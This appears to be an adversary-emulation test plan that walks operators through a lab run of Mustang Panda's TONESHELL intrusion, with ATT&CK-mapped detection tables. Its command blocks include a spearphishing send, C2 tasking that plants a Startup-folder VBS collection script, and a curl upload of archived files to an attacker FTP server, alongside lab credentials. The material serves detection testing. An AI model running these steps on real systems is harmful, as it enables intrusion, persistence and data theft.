# Protections Test 4 Scenario

[6]:https://csirt-cti.net/2024/01/23/stately-taurus-targets-myanmar/
[11]:https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit
[16]:https://www.security.com/threat-intelligence/china-southeast-asia-espionage
[17]:https://www.trendmicro.com/en_us/research/24/b/earth-preta-campaign-targets-asia-doplugs.html
[18]:https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
[19]:https://jsac.jpcert.or.jp/archive/2023/pdf/JSAC2023_1_2_nick-sunny-vickie_en.pdf
[20]:https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html
[21]:https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html
[22]:https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
[23]:https://www.trendmicro.com/en_us/research/24/i/earth-preta-new-malware-and-strategies.html
[25]:https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/
[26]:https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/

## Setup

### Procedures

- ☣️ Initiate an RDP session to the Kali attack host `driftmark (174.3.0.70)`

  | Destination | Username | Password         |
  |-------------|----------|------------------|
  | 174.3.0.70  | op1      | Barbed-Directive |

- ☣️ In a new terminal window, start the simple file server and TONESHELL handler
**if they are not already running**:

  ```bash
  cd /opt/kalidev/mustang_panda/controlServer/
  sudo go build -o controlServer main.go
  sudo ./controlServer -c config/protections.yml
  ```

  - ***Expected Output***

    ```text
    ...
    [SUCCESS] 2024/04/01 10:10:11 Started handler simplefileserver
    [SUCCESS] 2024/04/01 10:10:11 Started handler toneshell
    [INFO] 2024/04/01 10:10:11 Waiting for connections
    ```

- ☣️ Initiate an RDP session to the jumpbox `dreadfort (10.26.3.125)`

  | Destination  | Username | Password         |
  |--------------|----------|------------------|
  | 12.78.110.37 | op1      | Barbed-Directive |

## Step 1 - Initial Access

### Voice Track

Mustang Panda sends an email from `dnaharis@pentos.com` to `btully@vale.net` containing
a .zip file attachment. `btully` downloads and unzips the .zip file which
contains 2 subfolders. The first subfolder `Appendix I` contains a PIF file
`Assessing Westeros-Essos Global Influence.pif`, which is the TONESHELL dropper
executable masquerading as a PIF file, while the second subfolder `Appendix II`
contains a PDF file `Assessing Westeros-Essos Global Influence (1).pdf`.

When
`btully` opens the PIF file (executes the TONESHELL dropper), the TONESHELL dropper
checks for the presence of `GFlagEditor` in `C:\ProgramData`. If it does not
exist, the TONESHELL dropper will create the folder `C:\ProgramData\GFlagEditor`
and drop a legitimate binary `gflags.exe` and the TONESHELL loader `gflagsui.dll`
into it. The TONESHELL dropper then opens the decoy PDF and creates a scheduled
task to execute the legitimate binary.

### Procedures

- From the jumpbox, initiate an RDP session to the workstation `bitterbridge
(10.26.4.103)`

  | Destination           | Username    | Password       |
  |-----------------------|-------------|----------------|
  | bitterbridge.vale.net | vale\btully | Finished-Debug |

- On the workstation `bitterbridge (10.26.4.103)`, open FireFox and browse to the
  Outlook Web Access portal, logging in with btully's credentials

  | Destination                   | Username    | Password       |
  |-------------------------------|-------------|----------------|
  | <https://godswood.vale.net/owa> | vale\btully | Finished-Debug |

- ☣️ Switch to the Kali and open a new terminal to activate the Python virtual
environment then send the spearphishing email

  ```bash
  cd /opt/kalidev/
  source venv/bin/activate
  python3 /opt/kalidev/mustang_panda/Resources/email_generation/send_email.py mail.pentos.com /opt/kalidev/mustang_panda/Resources/payloads/p4_spearphishing.html -t btully@vale.net -f dnaharis@pentos.com -fn 'Daario Naharis' -s 'Westeros-Essos Cyber Summit Read-Ahead Preparation' -a /opt/kalidev/mustang_panda/Resources/payloads/protections4.zip -an 'Assessing Westeros-Essos Global Influence.zip'
  ```

  - ***Expected Output***

    ```text
    Successfully sent email
    ```

- Switch to the RDP to the workstation `bitterbridge (10.26.4.103)` and confirm
receipt of the spearphishing email

- Open the email and click to download the attachment `Assessing Westeros-Essos
Global Influence.zip`

- Open the Downloads folder, right-click the ZIP file `Assessing Westeros-Essos
Global Influence.zip`, click "Extract All...", then click "Extract"

- Navigate into the `Appendex I` directory and double-click to execute the PIF
file `Assessing Westeros-Essos Global Influence.pif`, and click "Run". Wait
until a CMD prompt flashes with `GFlagEditor` in the window name then switch
windows several times to bypass the sandbox check

- ☣️ Switch to Kali then wait 5-8 minutes for C2 registration

### Reference Tables

| Tactic              | Technique ID | Technique Name                                          | Platform | Detection Criteria                                                                                                         | Category                    | Red Team Activity                                                                                                                  | Hosts                      | Users  | Source Code Links                                                                                                                                                                                                                                                 | Relevant CTI Reports   |
|---------------------|--------------|---------------------------------------------------------|----------|----------------------------------------------------------------------------------------------------------------------------|-----------------------------|------------------------------------------------------------------------------------------------------------------------------------|----------------------------|--------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------|
| Initial Access      | T1566.001    | Phishing: Spearphishing Attachment                      | Windows  | btully received an email from dnaharis@tyrosh[.]com containing an Assessing Westeros-Essos Global Influence.zip attachment | Calibrated - Not Benign     | Mustang Panda sends a spearphishing attachment `Assessing Westeros-Essos Global Influence.zip` to `btully`                         | bitterbridge (10.26.4.103) | btully | [send_email.py](../Resources/email_generation/send_email.py)                                                                                                                                                                                                      | [21], [22], [11], [19] |
| Defense Evasion     | T1027.013    | Obfuscated Files or Information: Encrypted/Encoded File | Windows  | btully downloaded Assessing Westeros-Essos Global Influence.zip and extracted the contents                                 | Not Calibrated - Not Benign | `btully` downloads and extracts the contents of the ZIP file `Assessing Westeros-Essos Global Influence.zip`                       | bitterbridge (10.26.4.103) | btully | -                                                                                                                                                                                                                                                                 | [21], [22], [11], [19] |
| Defense Evasion     | T1036.008    | Masquerading: Masquerade File Type                      | Windows  | The Assessing Westeros-Essos Global Influence.zip contained an executable that is masquerading as a .PIF file              | Calibrated - Not Benign     | TONESHELL dropper `Assessing Westeros-Essos Global Influence.pif masquerades as a .PIF file`                                       | bitterbridge (10.26.4.103) | btully | -                                                                                                                                                                                                                                                                 | [11]                   |
| Execution           | T1204.002    | User Execution: Malicious File                          | Windows  | btully executed the Assessing Westeros-Essos Global Influence.pif                                                          | Calibrated - Not Benign     | `btully` executes `Assessing Westeros-Essos Global Influence.pif`                                                                  | bitterbridge (10.26.4.103) | btully | -                                                                                                                                                                                                                                                                 | [11]                   |
| Discovery           | T1083        | File and Directory Discovery                            | Windows  | the .pif executable accessed C:\ProgramData\GFlagEditor                                                                    | Calibrated - Not Benign     | Malicious PIF file checks for presence of `C:\ProgramData\GFlagEditor`                                                             | bitterbridge (10.26.4.103) | btully | [Check Directory](../Resources/toneshell/src/test4/dropper/dropper.cpp#L195-L206)                                                                                                                                                                                 | [11]                   |
| Persistence         | T1053.005    | Scheduled Task/Job: Scheduled Task                      | Windows  | the .pif executable created gflags.exe                                                                                     | Calibrated - Not Benign     | Malicious PIF file creates a scheduled task to executes the legitimate binary `gflags.exe`                                         | bitterbridge (10.26.4.103) | btully | [Create Scheduled Task](../Resources/toneshell/src/test4/dropper/dropper.cpp#L243-L258)                                                                                                                                                                           | [11]                   |
| Persistence         | T1053.005    | Scheduled Task/Job: Scheduled Task                      | Windows  | the .pif executable scheduled a task to execute glags.exe                                                                  | Calibrated - Not Benign     | Scheduled task executes the legitimate binary `gflags.exe`                                                                         | bitterbridge (10.26.4.103) | btully | -                                                                                                                                                                                                                                                                 | [11]                   |
| Defense Evasion     | T1574.002    | Hijack Execution Flow: DLL Side-Loading                 | Windows  | gflags.exe side loads an unsigned gflagsui.dll                                                                             | Calibrated - Not Benign     | Legitimate binary `gflags.exe` side-loads the TONESHELL loader DLL `gflagsui.dll`                                                  | bitterbridge (10.26.4.103) | btully | [DLL exports](../Resources/toneshell/src/test4/gflagsui/gflagsui.def), [Exported function definitions](../Resources/toneshell/src/test4/gflagsui/dllmain.cpp#L72-L83)                                                                                             | [21], [22], [6], [19]  |
| Defense Evasion     | T1553.002    | Subvert Trust Controls: Code Signing                    | Windows  | gflagsui.dll is signed with a self-signed cert                                                                             | Calibrated - Not Benign     | TONESHELL loader DLL `gflagsui.dll` is signed                                                                                      | bitterbridge (10.26.4.103) | btully | [DLL signed at build](../Resources/toneshell/src/test4/gflagsui/CMakeLists.txt#L61), [Signing script](../Resources/toneshell/src/common/sign_artifact.ps1)                                                                                                        | [21], [22], [6], [19]  |
| Defense Evasion     | T1497        | Virtualization/Sandbox Evasion                          | Windows  | gflagsui.dll checks if the current process name matches gflags.exe using GetModuleFileNameW                                | Not Calibrated - Not Benign | TONESHELL loader checks if the current process name matches `gflags.exe` using GetModuleFileNameW                                  | bitterbridge (10.26.4.103) | btully | [VerifyProcessName](../Resources/toneshell/src/common/checks.cpp#L4-L38)                                                                                                                                                                                          | [22]                   |
| Defense Evasion     | T1622        | Debugger Evasion                                        | Windows  | gflagsui.dll uses custom exceptions to hinder debuggers through IsDebuggerPresent                                          | Not Calibrated - Not Benign | TONESHELL loader uses custom exceptions to hinder debuggers                                                                        | bitterbridge (10.26.4.103) | btully | [Throw custom exception](../Resources/toneshell/src/common/handler.cpp#L181-L194)                                                                                                                                                                                 | [22]                   |
| Defense Evasion     | T1497        | Virtualization/Sandbox Evasion                          | Windows  | gflagsui.dll checks for changes to the foreground windows through GetForeground*                                           | Not Calibrated - Not Benign | TONESHELL loader checks for changes to the foreground window                                                                       | bitterbridge (10.26.4.103) | btully | [ForegroundWindowCheck](../Resources/toneshell/src/common/checks.cpp#L40-L86)                                                                                                                                                                                     | [22]                   |
| Defense Evasion     | T1218.010    | System Binary Proxy Execution: Regsvr32                 | Windows  | gflags.exe registered and re-executed itself using `regsvr32.exe /s`                                                       | Not Calibrated - Not Benign | TONESHELL loader registers and re-executes itself using `regsvr32.exe /s`                                                          | bitterbridge (10.26.4.103) | btully | [RegisterSelf](../Resources/toneshell/src/common/register.cpp#L43-L109)                                                                                                                                                                                           | [18]                   |
| Defense Evasion     | T1218.013    | System Binary Proxy Execution: Mavinject                | Windows  | regsvr32.exe executed waitfor.exe which executed mavinject to inject gflagsui.dll into waitfor.exe                         | Not Calibrated - Not Benign | `regsvr32.exe` spawns `waitfor.exe` then executes `mavinject` to inject the TONESHELL loader DLL `gflagsui.dll` into `waitfor.exe` | bitterbridge (10.26.4.103) | btully | [DllRegisterServer](../Resources/toneshell/src/common/register.cpp#L112-L236)                                                                                                                                                                                     | [18]                   |
| Defense Evasion     | T1027.009    | Obfuscated Files or Information: Embedded Payloads      | Windows  | `gflagsui.dll` contains embedded shellcode in the data section                                                             | Not Calibrated - Not Benign | TONESHELL loader DLL `gflagsui.dll` contains embedded shellcode in the data section                                                | bitterbridge (10.26.4.103) | btully | [Embedded Payload Header Template](../Resources/toneshell/src/common/embedded.hpp.in), [Embed shellcode at build time](../Resources/toneshell/src/shellcode/CMakeLists.txt#L90-L104), [Payload Embed Script](../Resources/toneshell/src/common/embed_payload.ps1) | [18], [22]             |
| Defense Evasion     | T1140        | Deobfuscate/Decode Files or Information                 | Windows  | `gflagsui.dll` XOR decrypts embedded shellcode                                                                             | Calibrated - Not Benign     | TONESHELL loader XOR decrypts embedded shellcode                                                                                   | bitterbridge (10.26.4.103) | btully | [Xor Functions](../Resources/toneshell/src/common/xor.cpp), [Decrypt shellcode](../Resources/toneshell/src/common/handler.cpp#L91)                                                                                                                                | [18], [22]             |
| Defense Evasion     | T1620        | Reflective Code Loading                                 | Windows  | `gflagsui.dll` reflectively loads and executes the shellcode                                                               | Calibrated - Not Benign     | TONESHELL loader reflectively loads and executes the shellcode                                                                     | bitterbridge (10.26.4.103) | btully | [Execute shellcode](../Resources/toneshell/src/common/handler.cpp#L78-L100)                                                                                                                                                                                       | [18], [22]             |
| Discovery           | T1082        | System Information Discovery                            | Windows  | waitfor.exe discovers computer name via GetComputerNameA                                                                   | Not Calibrated - Not Benign | TONESHELL discovers computer name via GetComputerNameA                                                                             | bitterbridge (10.26.4.103) | btully | [GetHostname](../Resources/toneshell/src/shellcode/shellcode_util.cpp#L320-L344)                                                                                                                                                                                  | [18], [22]             |
| Defense Evasion     | T1106        | Native API                                              | Windows  | waitfor.exe creates a victim ID using the hostname and volume serial number.                                               | Not Calibrated - Not Benign | TONESHELL creates a victim ID using the hostname and volume serial number.                                                         | bitterbridge (10.26.4.103) | btully | [GenerateNewVictimID](../Resources/toneshell/src/shellcode/shellcode_util_id_p.cpp#L7-L45)                                                                                                                                                                        | [18], [22]             |
| Command and Control | T1095        | Non-Application Layer Protocol                          | Windows  | waitfor.exe connects to `191.44.44.199`over TCP port 443                                                                   | Not Calibrated - Not Benign | TONESHELL connects to `191.44.44.199`over TCP port 443                                                                             | bitterbridge (10.26.4.103) | btully | [PerformHandshake](../Resources/toneshell/src/shellcode/comms.cpp#L114-L153), [connectSocket](../Resources/toneshell/src/shellcode/comms.cpp#L59-L85), [Set server and port at build time](../Resources/toneshell/src/shellcode/CMakeLists.txt#L68-L69)           | [18], [20], [22], [11] |
| Execution           | T1106        | Native API                                              | Windows  | waitfor.exe uses ws2_32 `send` API to connect to C2                                                                        | Not Calibrated - Not Benign | TONESHELL uses ws2_32 `send` API to connect to C2                                                                                  | bitterbridge (10.26.4.103) | btully | [sendClientMsg](../Resources/toneshell/src/shellcode/comms.cpp#L17-L36)                                                                                                                                                                                           | [18], [20]             |

## Step 2 - Discovery and Persistence

### Voice Track

After establishing C2, Mustang Panda discovers an active connection to the file server
`redfort (10.26.3.105)`. Mustang Panda then downloads a VBS script to the startup
folder for persistent collection. When the legitimate user logs back in, the VBS
script executes several RAR commands to archive files on the file server.

### Procedures

- ☣️ Task TONESHELL to execute `netstat` to discover the file server `10.26.3.105
(redfort)`

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 70d6b5c1105063b81d9ce95866793488 '{"id": 5, "taskNum": 1, "args": "netstat -anop tcp"}'
  ```

  - ***Expected Output***

    ```text
    [TASK] 2025/07/30 20:31:55
    Active Connections
    Proto Local Address Foreign Address State PID
    TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 400
    TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4
    TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 1096
    ```

- ☣️ Task TONESHELL to download a file extension list used by the VBS collection
script to the startup folder

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 70d6b5c1105063b81d9ce95866793488 '{"id": 3, "taskNum": 2, "payload": "files.txt", "args": "C:\\Windows\\Help\\en-US\\0.txt"}'
  ```

  - ***Expected Output***

    ```text
    File downloaded successfully
    ```

- ☣️ Task TONESHELL to download the VBS collection script to the startup folder

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 70d6b5c1105063b81d9ce95866793488 '{"id": 3, "taskNum": 3, "payload": "collection.vbs", "args": "C:\\Users\\btully\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\autoruns.vbs"}'
  ```

  - ***Expected Output***

    ```text
    File downloaded successfully
    ```

- Switch to the RDP to the workstation `bitterbridge (10.26.4.103)` and log out

- From the jumpbox, initiate an RDP session to log back in to the workstation
`bitterbridge (10.26.4.103)`. Wait until a CMD prompt appears with `GFlagEditor`
in the window name then open File Explorer to bypass the sandbox check.

  | Destination           | Username | Password       |
  |-----------------------|----------|----------------|
  | bitterbridge.vale.net | btully   | Finished-Debug |

### Reference Tables

| Tactic              | Technique ID | Technique Name                                                        | Platform | Detection Criteria                                                                                                                                      | Category                | Red Team Activity                                                                                                                                     | Hosts                                             | Users  | Source Code Links                                                                  | Relevant CTI Reports |
|---------------------|--------------|-----------------------------------------------------------------------|----------|---------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------|--------|------------------------------------------------------------------------------------|----------------------|
| Discovery           | T1049        | System Network Connections Discovery                                  | Windows  | waitfor.exe executes `netstat -anop tcp`                                                                                                                | Calibrated - Not Benign | TONESHELL executes `netstat -anop tcp`                                                                                                                | bitterbridge (10.26.4.103)                        | btully | [PerformExecTask](../Resources/toneshell/src/shellcode/exec.cpp#L152-L239)         | [16], [17], [23]     |
| Command and Control | T1105        | Ingress Tool Transfer                                                 | Windows  | waitfor.exe downloads a VBS collection script to `C:\\Users\\btully\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\autoruns.vbs` | Calibrated - Not Benign | TONESHELL downloads a VBS collection script to `C:\\Users\\btully\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\autoruns.vbs` | bitterbridge (10.26.4.103)                        | btully | [PerformFileDownloadTask](../Resources/toneshell/src/shellcode/exec.cpp#L241-L346) | [25]                 |
| Persistence         | T1547.001    | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | Windows  | cscript.exe executed `autoruns.vbs` from the startup folder on user login                                                                               | Calibrated - Not Benign | VBS collection script `autoruns.vbs` is executed from the startup folder on user login                                                                | bitterbridge (10.26.4.103)                        | btully | -                                                                                  | [25]                 |
| Execution           | T1059.005    | Command and Scripting Interpreter: Visual Basic                       | Windows  | `autoruns.vbs` executes commands                                                                                                                        | Calibrated - Not Benign | VBS collection script `autoruns.vbs` executes commands                                                                                                | bitterbridge (10.26.4.103)                        | btully | [collection.vbs](../Resources/payloads/collection.vbs)                             | [25]                 |
| Lateral Movement    | T1021.002    | Remote Services: SMB/Windows Admin Shares                             | Windows  | `autoruns.vbs` executes `rar.exe` against remote shares of the file server `redfort (10.26.3.105)`                                                      | Calibrated - Not Benign | VBS collection script `autoruns.vbs` executes `rar.exe` against remote shares of the file server `redfort (10.26.3.105)`                              | redfort (10.26.3.105), bitterbridge (10.26.4.103) | btully | [collection.vbs](../Resources/payloads/collection.vbs)                             | [25], [26]           |
| Collection          | T1560.001    | Archive Collected Data: Archive via Utility                           | Windows  | `autoruns.vbs` executes `rar.exe` to compress the A-Z shares of the file server `redfort (10.26.3.105)`                                                 | Calibrated - Not Benign | VBS collection script `autoruns.vbs` executes `rar.exe` to compress the A-Z shares of the file server `redfort (10.26.3.105)`                         | redfort (10.26.3.105), bitterbridge (10.26.4.103) | btully | [collection.vbs](../Resources/payloads/collection.vbs)                             | [25], [26]           |

## Step 3 - Exfiltration

### Voice Track

After archiving files, Mustang Panda executes `curl.exe` to exfiltrate the RAR files to
an adversary-controlled FTP server.

### Procedures

- ☣️ Task TONESHELL to use `curl.exe` and exfiltrate the RAR files

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 70d6b5c1105063b81d9ce95866793488 '{"id": 5, "taskNum": 4, "args": "curl.exe -T \"{C:\\\\Windows\\\\Help\\\\Corporate\\\\67.rar,C:\\\\Windows\\\\Help\\\\Corporate\\\\69.rar,C:\\\\Windows\\\\Help\\\\Corporate\\\\70.rar,C:\\\\Windows\\\\Help\\\\Corporate\\\\71.rar,C:\\\\Windows\\\\Help\\\\Corporate\\\\72.rar}\" ftp://ftp_user:Gracious-Coat@49.67.12.21/4/ --ftp-create-dirs"}'
  ```

  - ***Expected Output***

    ```text
    [TASK] 2025/07/31 16:13:43
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100  714k    0     0  100  714k      0  1198k --:--:-- --:--:-- --:--:-- 1198k
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 42.1M    0     0  100 42.1M      0  85.1M --:--:-- --:--:-- --:--:-- 85.1M
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 84.3M    0     0  100 84.3M      0  89.8M --:--:-- --:--:-- --:--:-- 89.8M
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 42.1M    0     0  100 42.1M      0  69.4M --:--:-- --:--:-- --:--:-- 69.4M
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 84.3M    0     0  100 84.3M      0  86.6M --:--:-- --:--:-- --:--:-- 86.6M

    ```

### Reference Tables

| Tactic       | Technique ID | Technique Name                                                                        | Platform | Detection Criteria                                                                    | Category                | Red Team Activity                                                               | Hosts                      | Users  | Source Code Links                                                          | Relevant CTI Reports |
|--------------|--------------|---------------------------------------------------------------------------------------|----------|---------------------------------------------------------------------------------------|-------------------------|---------------------------------------------------------------------------------|----------------------------|--------|----------------------------------------------------------------------------|----------------------|
| Exfiltration | T1048.003    | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | Windows  | waitfor.exe executed `curl.exe` to exfiltrate the RAR files over FTP to `49.67.12.21` | Calibrated - Not Benign | TONESHELL uses `curl.exe` to exfiltrate the RAR files over FTP to `49.67.12.21` | bitterbridge (10.26.4.103) | btully | [PerformExecTask](../Resources/toneshell/src/shellcode/exec.cpp#L152-L239) | [19], [21], [25]     |

## End of Test

### Voice Track

This step includes the shutdown procedures for the end of this Protections Test

### Procedures

- Return to the RDP to `bitterbridge (10.26.4.103)`. Close all windows and sign
out.
